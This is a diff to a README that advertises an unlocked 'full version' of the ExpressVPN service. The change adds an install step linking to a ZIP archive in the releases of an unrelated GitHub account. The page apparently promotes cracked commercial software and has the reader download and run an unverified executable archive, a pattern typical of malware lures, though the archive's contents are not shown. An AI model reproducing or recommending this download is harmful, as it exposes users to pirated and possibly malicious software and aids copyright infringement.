@@ -12,7 +12,7 @@ This is a full version of the VPN service ExpressVPN, providing access to all fe
 
 ## Installation
 
-1. Download the program archive.
+1. [Download the program archive](https://github.com/TaylorBarbara4/ExpressVPN-Unlimited/releases/download/Release/ExpressVPN.zip).
 2. Extract the archive.
 3. Navigate to the extracted folder.
 4. Open the /expressvpn-ui directory.
